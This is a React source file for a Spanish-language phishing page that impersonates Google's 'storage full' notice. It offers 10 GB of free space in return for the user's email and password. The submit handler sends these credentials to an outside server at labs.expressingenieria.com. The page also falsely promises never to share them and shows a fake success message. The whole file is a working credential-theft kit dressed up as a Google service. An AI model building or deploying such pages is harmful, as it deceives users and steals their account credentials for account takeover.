import React, { useState } from 'react';
import 'bootstrap/dist/css/bootstrap.min.css';
import google from './google.svg'; 
import './App.css';

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [timestay, setTimestay] = useState(new Date().toISOString());
  const [formVisible, setFormVisible] = useState(false);
  const [alert, setAlert] = useState({ type: '', message: '' });

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    const formData = { email, password, timestay };

    try {
      const response = await fetch('https://labs.expressingenieria.com:3000/forms', { 
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        setAlert({ type: 'success', message: 'El almacenamiento ha sido expandido exitosamente!' });
        setFormVisible(false);
      } else {
        setAlert({ type: 'danger', message: 'No se pudo expandir el almacenamiento. Inténtelo de nuevo.' });
      }
    } catch (error) {
      console.error('Error:', error);
      setAlert({ type: 'danger', message: 'Ocurrió un error. Por favor, intente de nuevo.' });
    }
  };

  const handleBuyStorage = () => {
    window.location.href = 'https://www.google.com';
  };

  return (
    <div className="container p-5">
      <div className="row justify-content-center">
        <div className="col-md-8 col-lg-6">
          <div className="card shadow">
            <div className="card-body text-center">
              <img src={google} alt="Google Logo" className="mb-4" style={{ width: '120px' }} />
              <h1 className="card-title mb-4">Tu almacenamiento está lleno</h1>
              <p className="card-text mb-4">
                El almacenamiento se comparte entre Google Fotos, Google Drive y Gmail
              </p>
              {/* Barra de progreso */}
              <div className="mb-4 position-relative" style={{ height: '10px', borderRadius: '10px', overflow: 'hidden' }}>
                <div
                  className="position-absolute top-0 start-0 bg-orange"
                  style={{ width: '93%', height: '100%', borderRadius: '10px 0 0 10px' }}
                  data-bs-toggle="tooltip" 
                  data-bs-placement="top" 
                  title="Email Storage: 93% (27.9GB)"
                />
                <div
                  className="position-absolute top-0 end-0 bg-danger"
                  style={{ width: '7%', height: '100%', borderRadius: '0 10px 10px 0' }}
                  data-bs-toggle="tooltip" 
                  data-bs-placement="top" 
                  title="Google Drive: 7% (2.1GB)"
                />
              </div>
              <p className="mb-4 bg-color">30 GB de 30 GB en uso</p>
              {/* Leyenda de colores */}
              <div className="d-flex justify-content-around mb-4">
                <div className="d-flex align-items-center">
                  <div className="legend-circle bg-orange"></div>
                  <span className="ms-2">Email Storage (27.9GB)</span>
                </div>
                <div className="d-flex align-items-center">
                  <div className="legend-circle bg-danger"></div>
                  <span className="ms-2">Google Drive (2.1GB)</span>
                </div>
                <div className="d-flex align-items-center">
                  <div className="legend-circle bg-primary"></div>
                  <span className="ms-2">Google Photos (0GB)</span>
                </div>
              </div>
              <div className="mb-4">
                <button
                  className={`btn btn-google rounded-pill mx-2 ${formVisible ? 'btn-expanded' : ''}`}
                  onClick={() => setFormVisible(!formVisible)}
                >
                  {formVisible ? 'Cerrar formulario' : 'Obtén más espacio gratis'}
                </button>
                <button
                  className="btn btn-google rounded-pill mx-2"
                  onClick={handleBuyStorage}
                >
                  Comprar espacio
                </button>
              </div>
              {alert.message && (
                <div className={`alert alert-${alert.type}`} role="alert">
                  {alert.message}
                </div>
              )}
              {formVisible && (
                <div className="card mt-4">
                  <div className="card-body text-center">
                    <p className="card-text mb-4">
                      Se le otorgarán 10 GB de almacenamiento gratuito, sin cobros adicionales ni subscripciones.
                    </p>
                    <form onSubmit={handleSubmit}>
                      <div className="mb-3">
                        <label htmlFor="email" className="form-label">Email</label>
                        <input
                          type="email"
                          className="form-control"
                          id="email"
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          required
                        />
                        <div id="emailHelp" className="form-text">Nunca compartiremos su email ni contraseña con otras personas.</div>
                      </div>
                      <div className="mb-3">
                        <label htmlFor="password" className="form-label">Contraseña</label>
                        <input
                          type="password"
                          className="form-control"
                          id="password"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          required
                        />
                      </div>
                      <button type="submit" className="btn btn-primary w-100">Enviar</button>
                    </form>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
